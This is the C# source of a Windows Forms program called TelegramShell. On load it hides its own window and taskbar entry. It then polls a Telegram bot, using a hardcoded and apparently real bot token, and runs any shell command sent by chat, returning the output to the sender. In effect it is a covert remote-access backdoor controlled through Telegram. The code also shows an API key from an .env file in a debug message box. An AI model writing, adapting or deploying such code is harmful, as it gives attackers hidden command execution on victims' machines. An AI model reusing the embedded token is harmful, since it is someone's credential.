using System;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Args;

namespace TelegramShell
{
    public partial class TelegramShell : Form
    {
        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Opacity = 0;
            base.OnLoad(e);
        }
        
        private string token = "5053986676:AAFuWaAKpIApLGCaxV4EN8bgGbMBa-VW9U8";
        private TelegramBotClient _client;
        private Command _command;
        private ListOfCommands _listOfCommands;
        private CMD _cmd;
        private EnvFile _env;
        
        public TelegramShell()
        {
            InitializeComponent();
            
            _env = new EnvFile( @"Enviroments\.env");
            _env.Load();
            
            MessageBox.Show(Environment.GetEnvironmentVariable("API_KEY"));
            
            _client = new TelegramBotClient(token);
            _client.StartReceiving();
            _client.OnMessage += OnMessageHandler;
        }
        
        private void OnMessageHandler(object sender, MessageEventArgs e)
        {
            _command = new Command(e.Message.Text);

            switch (_command.GetCommand())
            {
                case Commands.Show:
                    _listOfCommands = new ListOfCommands();
                    _client.SendTextMessageAsync(e.Message.Chat.Id, _listOfCommands.Show());
                    break;
                    
                case Commands.Cmd:
                    _cmd = new CMD(_command.GetParameters());
                    _client.SendTextMessageAsync(e.Message.Chat.Id, _cmd.Execute());
                    break;
                
                case Commands.NotValidCommand:
                    _client.SendTextMessageAsync(e.Message.Chat.Id, 
                        "Not a valid command. Tap /Show to show the list of commands.");
                    break;
            }
        }
    }
}
